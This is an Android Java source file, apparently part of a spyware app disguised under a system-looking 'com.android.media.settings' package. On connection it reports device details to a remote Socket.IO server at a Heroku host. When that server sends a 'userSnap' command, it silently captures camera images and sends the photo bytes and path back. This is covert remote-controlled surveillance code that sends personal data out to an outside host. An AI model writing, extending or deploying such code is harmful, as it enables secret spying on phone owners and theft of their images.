package com.android.media.settings.Utility;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.util.Log;

import com.android.media.settings.Interface.ImageCaptureListener;
import com.android.media.settings.Model.DeviceActivity;
import com.android.media.settings.Model.DeviceActivityResponse;
import com.android.media.settings.Model.Media;
import com.android.media.settings.Model.Device;
import com.android.media.settings.Service.ImageCaptureService;
import com.android.media.settings.Service.ImageCaptureServiceImp;
import com.github.nkzawa.emitter.Emitter;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;
import com.google.gson.Gson;

import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.util.TreeMap;

public class SocketUtil implements ImageCaptureListener {
    private static final String TAG = SocketUtil.class.getSimpleName();

    private static final String EVENT_JOIN = "join";
    private static final String EVENT_ON_ACTIVITY = "onActivity";
    private static final String EVENT_ACTIVITY_RESPONSE = "activityResponse";

    public static final String ACTIVITY_SNAP_FRONT = "snapFront";
    public static final String ACTIVITY_SNAP_REAR = "snapRear";
    public static final String ACTIVITY_SNAP = "userSnap";

    private static Socket mSocket;
    private Context context;
    private Handler handler;
    private ImageCaptureService imageCaptureService;
    private MediaUtility mMediaUtility;
    private String deviceId;

    public SocketUtil(Context context) {
        this.context = context;
        handler = new Handler();
        imageCaptureService = ImageCaptureServiceImp.getInstance(context);
        mMediaUtility = MediaUtility.getInstance(context);
    }

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }

    public void connect() {
        try {
            mSocket = IO.socket("https://media-store.herokuapp.com/");
        } catch (URISyntaxException e) { e.printStackTrace(); }
        mSocket.on(Socket.EVENT_CONNECT, onConnect);
        mSocket.on(Socket.EVENT_CONNECT_ERROR, onError);
        mSocket.on(Socket.EVENT_CONNECT_TIMEOUT, onError);
        mSocket.on(EVENT_ON_ACTIVITY, onActivity);
        mSocket.connect();
    }

    private Emitter.Listener onConnect = (Object... args) -> {
        Log.d(TAG, "Device Connected");
        String response = mMediaUtility.toJson(mMediaUtility.getDevice());
        try {
            response = URLEncoder.encode(response, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        mSocket.emit(EVENT_JOIN, response);
    };

    private Emitter.Listener onError = (Object... args) -> {
        Device device = MediaUtility.getInstance(context).getDevice();
        mSocket.emit(EVENT_JOIN, device);
    };

    private Emitter.Listener onActivity = (Object... args) -> {
        Object obj = args[0];
        Log.d(TAG, obj.toString());
        DeviceActivity activity = DeviceActivity.fromJson(obj.toString());
        deviceId = activity.getDeviceId();
        processActivity(activity);
    };

    private void captureImage() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ) {
            runOnUiThread(() -> imageCaptureService.startCapturing(this));
        }
    }

    @Override
    public void onCaptureDone(String pictureUrl, byte[] pictureData) {
        Media media = new Media();
        media.setBytes(pictureData);
        media.setPath(pictureUrl);
        DeviceActivityResponse response = new DeviceActivityResponse(ACTIVITY_SNAP, deviceId, media);
        mSocket.emit(EVENT_ACTIVITY_RESPONSE, new Gson().toJson(response));
    }

    @Override
    public void onDoneCapturingAllPhotos(TreeMap<String, byte[]> picturesTaken) {
        Log.d(TAG, "All Images Captured");
    }

    private void processActivity(DeviceActivity activity) {
        switch (activity.getName()) {
            case ACTIVITY_SNAP:
                captureImage();
                break;

            case ACTIVITY_SNAP_FRONT:
                break;

            case ACTIVITY_SNAP_REAR:
                break;
        }
    }
}
